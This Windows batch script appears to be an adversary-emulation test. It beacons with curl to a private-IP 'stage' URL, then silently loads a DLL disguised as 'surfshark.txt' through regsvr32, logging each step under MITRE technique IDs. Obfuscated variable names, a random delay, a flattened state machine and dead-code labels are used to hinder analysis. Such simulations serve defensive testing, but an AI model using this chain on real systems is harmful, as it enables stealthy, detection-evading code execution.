@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET yktnwwf=%APPDATA%\8901\2e3af43c
SET fpakbq=Macula-Stage0-8901
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8901-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=surfshark.txt
SET fpldhe=8901

SET /A delay=%RANDOM% %% 11 + 10
SET zxmqp=rdzgrnne
SET lmnbvq=yydue
SET qwerty=omxgazu
SET asdfgh=fpldhe
SET yuiop=edjwtl
SET hjkll=yktnwwf
SET vbnmc=regsvr32.exe
SET wsxza=%APPDATA%\!lmnbvq!\macula-simulations.log

timeout /t !delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!qwerty!]: initial_delay=!delay!s>> "!wsxza!" 2>nul

SET state=0
GOTO uwrstx

:uwrstx
IF !state!==0 GOTO nvxwqd
IF !state!==17 GOTO zqpxlm
IF !state!==42 GOTO lskqjt
IF !state!==99 GOTO plkjmn
GOTO plkjmn

:cdjkrx
REM Dead code - never reached
SET fake=data
GOTO END

:nvxwqd
echo [!DATE! !TIME!][DEBUG][!qwerty!]: heartbeat_start>> "!wsxza!" 2>nul
curl -k -s -o nul "!zxmqp!"
SET /A ttp_result=1
SET err_detail=
echo [!DATE! !TIME!][!qwerty!]: !lmnbvq!-!asdfgh!-T1218|Signed_Binary_Proxy_Execution=!ttp_result!:!err_detail!>> "!wsxza!" 2>nul
echo [!DATE! !TIME!][DEBUG][!qwerty!]: heartbeat_complete>> "!wsxza!" 2>nul
ping -n 8 127.0.0.1 >nul
SET state=17
GOTO uwrstx

:mgfnbv
REM Dead code - never reached
IF 0==0 EXIT /B

:zqpxlm
echo [!DATE! !TIME!][DEBUG][!qwerty!]: chdir_start=!hjkll!>> "!wsxza!" 2>nul
cd /d "!hjkll!" 2>nul
SET /A cd_result=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!qwerty!]: chdir_result=!cd_result!>> "!wsxza!" 2>nul
CHOICE /C Y /N /D Y /T 7 >nul
SET state=42
GOTO uwrstx

:qazwsx
REM Dead code - never reached
SET junk=morefake

:lskqjt
echo [!DATE! !TIME!][DEBUG][!qwerty!]: dll_exec_start=!yuiop!>> "!wsxza!" 2>nul
!vbnmc! /s "!yuiop!" 2>nul
SET /A exec_result=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!qwerty!]: dll_exec_result=!exec_result!>> "!wsxza!" 2>nul
IF !exec_result!==0 (
    SET /A ttp_result=1
    SET err_detail=
) ELSE (
    SET /A ttp_result=0
    SET err_detail=load_failed
)
echo [!DATE! !TIME!][!qwerty!]: !lmnbvq!-!asdfgh!-T1218.010|Regsvr32=!ttp_result!:!err_detail!>> "!wsxza!" 2>nul
timeout /t 12 /nobreak >nul
SET state=99
GOTO uwrstx

:edcrfv
REM Dead code - never reached
GOTO END

:plkjmn
echo [!DATE! !TIME!][DEBUG][!qwerty!]: script_complete>> "!wsxza!" 2>nul

:END
ENDLOCAL